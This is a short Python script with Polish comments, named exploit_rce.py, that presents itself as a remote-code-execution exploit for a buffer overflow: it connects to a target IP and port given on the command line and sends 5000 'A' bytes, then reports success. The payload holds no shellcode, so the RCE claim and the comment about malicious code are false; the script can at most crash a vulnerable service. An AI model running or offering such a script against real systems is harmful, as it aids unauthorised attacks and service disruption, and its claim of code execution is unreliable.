import socket
import sys

# Prosty exploit RCE na podatność typu buffer overflow
def exploit(target_ip, target_port):
    try:
        # Tworzenie połączenia z celem
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        # Przykładowe dane, które mogą wywołać RCE (np. zawierają złośliwy kod)
        payload = "A" * 5000  # Przepełnienie bufora
        s.send(payload.encode())
        print("Exploit wysłany pomyślnie!")
    except Exception as e:
        print(f"Błąd: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Użycie: exploit_rce.py <IP_Celu> <Port_Celu>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    exploit(target_ip, target_port)
